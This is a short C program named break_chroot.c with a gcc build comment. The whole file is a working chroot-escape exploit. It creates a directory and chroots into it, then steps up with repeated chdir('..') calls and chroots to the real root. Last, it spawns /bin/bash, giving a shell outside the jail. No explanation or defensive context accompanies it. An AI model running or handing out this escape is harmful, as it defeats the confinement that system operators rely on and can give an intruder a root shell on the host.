#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}
